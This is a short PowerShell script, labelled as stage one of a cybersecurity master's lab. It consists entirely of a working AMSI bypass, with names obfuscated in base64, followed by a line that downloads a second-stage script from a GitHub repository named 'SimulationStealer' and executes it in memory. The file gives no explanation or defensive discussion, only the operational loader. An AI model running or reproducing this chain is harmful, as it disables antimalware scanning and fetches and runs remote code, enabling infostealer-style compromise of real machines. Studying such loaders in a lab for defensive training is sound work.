# Stage 1 - AMSI Bypass obfusque + appel Stage 2
# Lab pedagogique Master Cybersecurite

# AMSI Bypass obfusque
$w = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))
$x = [Ref].Assembly.GetType('System.Management.Automation.'+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))
$y = $x.GetField($w,'NonPublic,Static')
$y.SetValue($null,$true)

# Appel Stage 2
$url = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/Stage2.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)